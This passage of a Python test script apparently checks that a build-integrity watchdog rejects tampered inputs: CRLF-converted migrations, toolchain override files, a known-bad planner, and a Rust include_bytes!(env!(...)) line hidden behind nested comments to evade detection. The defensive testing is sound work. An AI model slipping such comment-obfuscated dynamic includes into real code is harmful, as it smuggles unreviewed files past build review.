    if "worker-build source set drifted" not in result.stdout:
        raise SystemExit("worker build-input mutation failed for the wrong reason:\n" + result.stdout[-5000:])

with tempfile.TemporaryDirectory(prefix="watchdog-line-ending-mutation-") as temporary:
    mutated = Path(temporary)
    build(mutated, GOOD_PLANNER)
    migration = mutated / "migrations/0001_core.sql"
    original = migration.read_bytes()
    if b"\r" in original or b"\n" not in original:
        raise SystemExit("line-ending rehearsal requires the reviewed LF migration bytes")
    migration.write_bytes(original.replace(b"\n", b"\r\n"))
    result = check(mutated)
    if result.returncode == 0:
        raise SystemExit("line-ending-only build-input mutation was accepted")
    if "worker-build source set drifted" not in result.stdout:
        raise SystemExit(
            "line-ending mutation failed for the wrong reason:\n" + result.stdout[-5000:]
        )

with tempfile.TemporaryDirectory(prefix="watchdog-commented-include-mutation-") as temporary:
    mutated = Path(temporary)
    build(mutated, GOOD_PLANNER)
    worker_source = mutated / "crates/worker/src/main.rs"
    worker_source.write_text(
        worker_source.read_text(encoding="utf-8")
        + '\nconst UNBOUND: &[u8] = include_bytes /* nested /* legal */ comment */ '
        + '!(env!("UNBOUND_FILE"));\n',
        encoding="utf-8",
        newline="\n",
    )
    result = check(mutated)
    if result.returncode == 0:
        raise SystemExit("comment-separated dynamic Rust include was accepted")
    if "non-literal or unsupported compile-time include" not in result.stdout:
        raise SystemExit(
            "comment-separated include failed for the wrong reason:\n" + result.stdout[-5000:]
        )

for toolchain_override in ("rust-toolchain", "rust-toolchain.toml"):
    with tempfile.TemporaryDirectory(prefix="watchdog-toolchain-mutation-") as temporary:
        mutated = Path(temporary)
        build(mutated, GOOD_PLANNER)
        (mutated / toolchain_override).write_text("1.99.0\n", encoding="utf-8")
        result = check(mutated)
        if result.returncode == 0:
            raise SystemExit(f"unreviewed {toolchain_override} override was accepted")
        if "worker-build source set drifted" not in result.stdout:
            raise SystemExit(
                f"{toolchain_override} mutation failed for the wrong reason:\n"
                + result.stdout[-5000:]
            )

with tempfile.TemporaryDirectory(prefix="watchdog-known-bad-") as temporary:
    bad = Path(temporary)
    build(bad, BAD_PLANNER)
    result = check(bad)
    if result.returncode == 0:
        raise SystemExit("known-bad rehearsal was incorrectly accepted")
    if "fail closed" not in result.stdout.lower():
        raise SystemExit("known-bad rehearsal failed for the wrong reason:\n" + result.stdout[-5000:])

print("known-good accepted and known-bad rejected")
